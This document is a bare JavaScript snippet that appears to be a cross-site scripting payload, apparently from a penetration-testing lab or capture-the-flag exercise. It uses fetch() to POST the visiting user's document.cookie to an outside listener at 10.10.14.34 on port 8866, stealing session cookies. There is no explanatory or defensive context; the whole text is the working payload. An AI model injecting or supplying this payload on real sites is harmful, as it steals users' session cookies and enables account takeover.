fetch('http://10.10.14.34:8866', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'cookie=' + encodeURIComponent(document.cookie)
});
